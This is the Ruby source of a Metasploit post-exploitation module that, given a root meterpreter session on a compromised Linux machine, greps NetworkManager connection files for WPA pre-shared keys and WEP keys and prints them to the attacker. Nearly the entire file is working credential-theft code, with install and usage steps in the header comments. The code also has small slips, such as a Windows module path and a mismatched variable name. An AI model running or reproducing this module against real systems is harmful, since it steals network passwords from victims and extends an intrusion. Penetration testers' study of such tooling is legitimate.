##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



##
# [ wifi_dump_linux.rb - ESSID credentials dump (wlan/lan) ]
# Author: pedr0 Ubuntu [r00t-3xp10it]
# tested on: linux Kali 2.0
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-exploitation module requires a meterpreter session,
# to be able to dump ESSID stored passwords (wlan/lan) in linux.
# HINT: this module requires root privileges to run ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on => set SESSION 3
# Dump credentials from remote system      => set DUMP_CREDS true
# The default path for network connections => set REMOTE_DIR /etc/NetworkManager/system-connections
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/wifi_dump_linux.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gathern/wifi_dump_linux.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/gather
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/wlan/wifi_dump_linux
# msf post(wifi_dump_linux) > info
# msf post(wifi_dump_linux) > show options
# msf post(wifi_dump_linux) > show advanced options
# msf post(wifi_dump_linux) > set [option(s)]
# msf post(wifi_dump_linux) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##





#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'ESSID credentials dump (wlan/lan)',
                        'Description'   => %q{
                                        This module collects 802-11-Wireless-Security credentials such as Access-Point name and Pre-Shared-Key from your target CLIENT Linux machine using /etc/NetworkManager/system-connections/ files. The module gathers NetworkManager's plaintext "psk" information.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'jun 6 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',
                        'Targets'        =>
                                [
                                         [ 'linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
                                        'REMOTE_DIR' => '/etc/NetworkManager/system-connections',
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('REMOTE_DIR', [ true, 'The default path for network connections']),
                                OptString.new('DUMP_CREDS', [ false, 'Dump credentials from remote system', false])
                        ], self.class)
 
        end




#
# DUMP WLAN/WEP CREDENTIALS FROM TARGET ..
#
def ls_stage1

  rpath = datastore['REMOTE_DIR'] # /etc/NetworkManager/system-connections
  #
  # check for proper config settings enter...
  # to prevent 'unset all' from deleting default options...
  #
  if datastore['DUMP_CREDS'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DUMP_CREDS option...")
    return nil
  else
    print_status("Dumping remote credentials ..")
    Rex::sleep(1.0)
  end

    #
    # Check if NetworkManager path exists ..
    #
    if not session.fs.dir.exist?(rpath)
      print_error("Remote path: #{rpath} not found ..")
      print_line("")
      return nil
    end

      #
      # build logfile with results (dump) in target %temp% folder
      #
      wlan_out = cmd_exec("sudo grep psk= /etc/NetworkManager/system-connections/*")
      wep_out = cmd_exec("sudo grep wep-key0= /etc/NetworkManager/system-connections/*")
      #
      # Display results on screen ..
      #
      print_line("")
      print_good("Wlan dump:")
      print_good(wlan_out)
      print_line("")
      Rex::sleep(0.5)
      print_good("Wep dump:")
      print_good(wep_out)
      print_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error Running Command: #{e.class} #{e}")
  print_warning("Try to escalate session to [NT AUTHORITY/SYSTEM] before runing this module...")
end



#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client


      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +--------------------------------------------+")
    print_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
    print_line("    |            Author : r00t-3xp10it           |")
    print_line("    +--------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    #
    if not sysinfo['OS'] =~ /Linux/
      print_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    if not is_root?
      print_error("[ABORT]: Root access is required to dump creds ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['DUMP_CREDS']
         ls_stage1
      end
   end
end
